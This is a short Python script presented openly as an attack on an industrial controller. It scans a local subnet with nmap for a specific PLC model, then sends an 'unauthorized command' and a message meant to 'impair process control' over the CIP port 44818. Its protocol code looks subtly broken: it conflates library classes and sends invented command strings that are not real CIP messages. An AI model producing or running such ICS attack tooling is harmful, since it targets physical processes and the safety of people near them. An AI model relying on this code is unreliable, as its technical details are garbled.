import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def send_unauthorized_command(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the unauthorized command message
        unauthorized_command = 'START_ALARM'
        
        # Use scapy to send the unauthorized command message
        packet = IP(dst=plc_ip)/TCP(dport=44818)/CIP(message=unauthorized_command)
        send(packet, verbose=0)
        
        print(f"Unauthorized command message '{unauthorized_command}' sent to PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to send unauthorized command message: {e}")

def impair_process_control(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the process control to impair
        process_control = 'CONTROL_LOOP'
        impaired_control = 'CONTROL_LOOP_IMPAIRED'
        
        # Use scapy to impair the process control
        packet = IP(dst=plc_ip)/TCP(dport=44818)/CIP(message=impaired_control)
        send(packet, verbose=0)
        
        print(f"Process control '{process_control}' impaired on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to impair process control: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Send the unauthorized command message
        send_unauthorized_command(plc_ip)
        
        # Impair the process control
        impair_process_control(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()